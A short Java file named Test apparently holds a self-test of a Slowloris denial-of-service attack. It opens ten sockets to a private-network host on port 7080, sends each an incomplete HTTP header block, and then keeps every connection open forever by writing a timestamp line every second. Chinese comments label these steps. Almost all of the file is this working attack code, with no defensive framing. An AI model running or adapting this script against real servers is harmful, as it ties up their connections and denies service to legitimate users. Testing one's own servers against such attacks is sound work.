package com;

import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;

/**
 * @author ZhangShaowei on 2017/6/27 10:52
 */

public class Test {

    public static void main(String[] args) {
//        System.out.println(Integer.MAX_VALUE);
//        Calendar calendar = Calendar.getInstance(Locale.CHINA);
//        Date date = new Date();
//        System.err.println(calendar.get(Calendar.DAY_OF_WEEK) - 1);

        slowloris();
    }


    public static void slowloris() {

        int count = 10;

        List<Socket> sockets = new ArrayList<>();
        List<DataOutputStream> dataOutputStreams = new ArrayList<>();

        //建立连接
        for (int i = 1; i <= count; i++) {
            try {
                Socket client = new Socket("192.168.1.12", 7080);
                sockets.add(client);
            } catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }

            System.out.println("建立连接--" + i);
        }
        //发送不完整http请求
        for (int j = 0; j <= sockets.size() - 1; j++) {

            try {
                DataOutputStream outputStream = new DataOutputStream(sockets.get(j).getOutputStream());
                dataOutputStreams.add(outputStream);
                outputStream.writeBytes(" GET / HTTP/1.1\r\n"
                        + "Host: www.hostname:80\r\n"
                        + "Connection: keep-alive\r\n"
                        + "Content-Length: 42\r\n");
            } catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
            System.out.println("发送局部http请求---" + j);
        }

        //保持连接
        while (true) {
            for (int i = 0; i <= dataOutputStreams.size() - 1; i++) {
                try {
                    dataOutputStreams.get(i).writeBytes("TimeStamp:" + System.currentTimeMillis());
                    System.out.println("发送数据保持连接" + System.currentTimeMillis());
                    Thread.sleep(1000);
                } catch (Exception e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }
            }
        }

    }


}
